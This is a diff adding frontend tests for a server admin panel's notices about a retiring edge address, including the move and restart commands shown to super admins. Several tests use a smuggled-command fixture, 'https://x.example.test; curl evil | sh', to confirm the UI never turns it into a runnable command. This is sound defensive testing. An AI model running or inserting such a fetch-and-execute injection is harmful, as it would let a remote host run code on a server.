@@ -1,4 +1,4 @@
-import { act, fireEvent, render, screen, waitFor } from '@testing-library/react'
+import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
 import { toast } from 'sonner'
 import { type Api, ApiError } from '@/lib/api'
 import type { ServerEdge } from '@/lib/types'
@@ -24,8 +24,9 @@ function seed(role: 'super_admin' | 'collaborator', edge: ServerEdge, local: str
   useStore.setState({
     info: { ...serverInfo, member: { ...serverInfo.member, role } },
     capabilities: { gateway: 'local', methods: ['*'], ws: ['events'], local },
-    edge,
   })
+  // After the capabilities: a change of what the server serves clears the edge.
+  useStore.setState({ edge })
 }
 
 function api(over: Partial<Api> = {}): Api {
@@ -156,4 +157,150 @@ it('refreshes the owner and shows remote_error when the clone remote was not upd
   fireEvent.click(await screen.findByRole('button', { name: 'Connect my GitHub account (octo)' }))
   await screen.findByText('octo (github)')
   expect(toast.error).toHaveBeenCalledWith("the link is saved, but the clone's aether remote was not updated: no such directory")
+})
+
+describe('a retiring or retired edge address', () => {
+  const replacement = 'https://edge-new.example.test'
+  const move = `sudo cloudfield-server edge move ${replacement}`
+  const claimed: ServerEdge = { ...ownerless, owner: { provider: 'github', login: 'octo' }, claimed: true }
+
+  it('shows nothing without a notice', () => {
+    seed('super_admin', claimed)
+    render(<RemoteAccessSection client={api()} />)
+    expect(screen.queryByRole('status')).toBeNull()
+    expect(screen.queryByText(/retir/)).toBeNull()
+    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
+  })
+
+  it.each([
+    [{ state: 'retiring', replacement } as const, `${edgeURL} is retiring`, 'needs-you'],
+    [{ state: 'retiring', replacement, date: '2027-03-01' } as const, `${edgeURL} is retiring on 2027-03-01`, 'needs-you'],
+    [{ state: 'retired', replacement } as const, `${edgeURL} is retired`, 'failed'],
+  ])('warns a super admin with the commands for %o', (notice, title, tone) => {
+    seed('super_admin', { ...claimed, notice })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = screen.getByRole('status')
+    expect(callout.getAttribute('data-tone')).toBe(tone)
+    expect(within(callout).getByText(title)).toBeTruthy()
+    expect(within(callout).getByText(`Move this server to ${replacement}, another address of the same edge. Run on the server's host, adding the service's --config <file> if it has one.`)).toBeTruthy()
+    expect(within(callout).getByText(move)).toBeTruthy()
+    expect(within(callout).getByText('sudo systemctl restart aether-server')).toBeTruthy()
+    expect(within(callout).queryByText(/first connection to the edge/)).toBeNull()
+  })
+
+  it('says a first-use notice is trusted on first use only', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, first_use: true } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    const caution = callout.getByText("This came with the server's first connection to the edge, when it pinned the edge's key: confirm the new address with whoever runs the edge before you move.")
+    expect(caution.compareDocumentPosition(callout.getByText(`sudo cloudfield-server edge move ${replacement}`)) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+    expect(caution.compareDocumentPosition(callout.getByText(/^Move this server to/)) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+  })
+
+  it.each([
+    ['a move waiting for a restart', { restart_pending: true, moved_to: replacement }],
+  ] as const)('cautions a first-use notice and refuses an unusable address before %s', (_, extra) => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, first_use: true, ...extra } })
+    const { unmount } = render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    const caution = callout.getByText(/first connection to the edge/)
+    expect(caution.compareDocumentPosition(callout.getByText('sudo systemctl restart aether-server')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
+    unmount()
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh', ...extra } })
+    render(<RemoteAccessSection client={api()} />)
+    const unusable = within(screen.getByRole('status'))
+    expect(unusable.getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
+    expect(unusable.queryByText(/systemctl|cloudfield-server|Change the flag/)).toBeNull()
+  })
+
+  const third = 'https://edge-third.example.test'
+  const pending = { state: 'retired', edge_url: replacement, replacement: third } as const
+
+  it.each([
+    ['with', { state: 'retiring', replacement, restart_pending: true, moved_to: replacement } as const],
+    ['without', undefined],
+  ])('says to move on first when the configured address is leaving too, %s a notice for the running one', (_, notice) => {
+    seed('super_admin', { ...claimed, notice, pending })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(`${replacement}, which edge-url names for the next restart, is retired`)).toBeTruthy()
+    expect(callout.getByText(`The server's options file names ${replacement}, which is itself retired, so a restart would move the server to a leaving address. Move it to ${third} first. Run on the server's host, adding the service's --config <file> if it has one.`)).toBeTruthy()
+    expect(callout.getByText(`sudo cloudfield-server edge move ${third}`)).toBeTruthy()
+    expect(callout.getByText('sudo systemctl restart aether-server')).toBeTruthy()
+    expect(callout.queryByText(`${edgeURL} is retiring; the server still runs there.`) !== null).toBe(notice !== undefined)
+  })
+
+  it('shows the move on even when the running address names an unusable replacement', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh', restart_pending: true }, pending })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(`sudo cloudfield-server edge move ${third}`)).toBeTruthy()
+    expect(callout.queryByText(/curl evil/)).toBeNull()
+  })
+
+  it('gives no command for an unusable replacement of the configured address, after the first-use caution', () => {
+    seed('super_admin', { ...claimed, pending: { ...pending, replacement: 'https://x.example.test; curl evil | sh', first_use: true } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(/first connection to the edge/)).toBeTruthy()
+    expect(callout.getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
+    expect(callout.queryByText(/systemctl|cloudfield-server/)).toBeNull()
+  })
+
+  it.each([
+    ['with', { state: 'retiring', replacement, restart_pending: true } as const, ` ${edgeURL} is retiring; the edge recommends ${replacement}.`],
+    ['without', undefined, ''],
+  ])('tells other members a pending change is to a leaving address, %s a notice for the running one', (_, notice, running) => {
+    seed('collaborator', { ...claimed, notice, pending: { state: 'retiring', date: '2027-04-01' } })
+    render(<RemoteAccessSection client={api()} />)
+    expect(screen.getByText(`The address edge-url names for the next restart is retiring on 2027-04-01. A super admin moves the server.${running}`)).toBeTruthy()
+    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
+  })
+
+  it('tells other members a move waits for a restart', () => {
+    seed('collaborator', { ...claimed, notice: { state: 'retiring', replacement, restart_pending: true } })
+    render(<RemoteAccessSection client={api()} />)
+    expect(screen.getByText(`${edgeURL} is retiring; the edge recommends ${replacement}. A change of the server's edge address is configured and waits for a restart.`)).toBeTruthy()
+  })
+
+  it('says to restart once the options file names the new address', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, restart_pending: true, moved_to: replacement } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(`The server's options file already names ${replacement}; the server still runs at ${edgeURL}. Restart it on the server's host to apply:`)).toBeTruthy()
+    expect(callout.getByText('sudo systemctl restart aether-server')).toBeTruthy()
+    expect(callout.queryByText(/edge move/)).toBeNull()
+    expect(callout.queryByText(/Move the server/)).toBeNull()
+  })
+
+  it('shows a replacement that is not a bare https origin as text, with no command', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh' } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = screen.getByRole('status')
+    expect(within(callout).getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
+    expect(within(callout).getByText('https://x.example.test; curl evil | sh')).toBeTruthy()
+    expect(within(callout).getByText('Confirm the new address with whoever runs the edge.')).toBeTruthy()
+    expect(within(callout).queryByText(/cloudfield-server/)).toBeNull()
+  })
+
+  it('keeps the last answer when a read fails, with the error and Try again', async () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement } })
+    const client = api({ serverEdge: vi.fn<Api['serverEdge']>().mockRejectedValueOnce(new Error('server.edge: connection reset')).mockResolvedValue(claimed) })
+    render(<RemoteAccessSection client={client} />)
+    const alert = await screen.findByRole('alert')
+    expect(within(alert).getByText("Showing the last answer: reading the server's edge again failed")).toBeTruthy()
+    expect(within(alert).getByText('server.edge: connection reset')).toBeTruthy()
+    expect(screen.getByText(`${edgeURL} is retiring`)).toBeTruthy()
+    fireEvent.click(within(alert).getByRole('button', { name: 'Try again' }))
+    await waitFor(() => expect(screen.queryByText(`${edgeURL} is retiring`)).toBeNull())
+    expect(screen.queryByRole('alert')).toBeNull()
+  })
+
+  it('gives other members a plain row without the command', () => {
+    seed('collaborator', { ...claimed, notice: { state: 'retiring', replacement, date: '2027-03-01' } })
+    render(<RemoteAccessSection client={api()} />)
+    expect(screen.queryByRole('status')).toBeNull()
+    expect(screen.getByText(`${edgeURL} is retiring on 2027-03-01; the edge recommends ${replacement}. A super admin moves the server.`)).toBeTruthy()
+    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
+  })
 })
